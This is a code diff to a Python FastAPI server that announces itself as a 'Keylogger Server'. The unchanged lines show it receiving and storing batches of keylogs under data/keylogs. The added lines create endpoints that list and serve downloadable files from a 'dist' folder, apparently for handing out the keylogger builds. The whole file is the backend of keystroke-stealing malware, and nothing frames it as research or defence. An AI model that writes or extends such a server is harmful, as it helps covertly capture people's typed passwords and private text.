@@ -1,4 +1,5 @@
 from fastapi import FastAPI, HTTPException
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 from datetime import datetime
 import json
@@ -22,6 +23,9 @@ class KeylogBatch(BaseModel):
 DATA_DIR = "data/keylogs"
 if not os.path.exists(DATA_DIR):
     os.makedirs(DATA_DIR)
+
+# Dist folder path for file downloads
+DIST_DIR = "dist"
 
 @app.get("/")
 async def root():
@@ -103,6 +107,70 @@ async def get_keylog(filename: str):
         raise HTTPException(status_code=404, detail="File not found")
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error reading file: {str(e)}")
+
+@app.get("/files")
+async def list_dist_files():
+    """
+    List all files in the dist folder available for download
+    """
+    try:
+        if not os.path.exists(DIST_DIR):
+            return {"files": [], "total": 0, "message": "Dist folder not found"}
+        
+        files = []
+        for root, dirs, filenames in os.walk(DIST_DIR):
+            for filename in filenames:
+                filepath = os.path.join(root, filename)
+                relative_path = os.path.relpath(filepath, DIST_DIR)
+                stat = os.stat(filepath)
+                files.append({
+                    "filename": filename,
+                    "relative_path": relative_path.replace("\\", "/"),  # Use forward slashes for URLs
+                    "size": stat.st_size,
+                    "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
+                    "download_url": f"/download/{relative_path.replace(os.sep, '/')}"
+                })
+        
+        return {"files": files, "total": len(files)}
+    
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error listing dist files: {str(e)}")
+
+@app.get("/download/{file_path:path}")
+async def download_file(file_path: str):
+    """
+    Download a file from the dist folder
+    """
+    try:
+        # Construct the full file path
+        full_path = os.path.join(DIST_DIR, file_path)
+        
+        # Security check: ensure the file is within the dist directory
+        if not os.path.abspath(full_path).startswith(os.path.abspath(DIST_DIR)):
+            raise HTTPException(status_code=403, detail="Access denied")
+        
+        # Check if file exists
+        if not os.path.exists(full_path):
+            raise HTTPException(status_code=404, detail="File not found")
+        
+        # Check if it's a file (not a directory)
+        if not os.path.isfile(full_path):
+            raise HTTPException(status_code=400, detail="Path is not a file")
+        
+        # Get filename for download
+        filename = os.path.basename(full_path)
+        
+        # Return file for download
+        return FileResponse(
+            path=full_path,
+            filename=filename,
+            media_type='application/octet-stream'
+        )
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error downloading file: {str(e)}")
 
 if __name__ == "__main__":
     print("Starting Keylogger Server...")
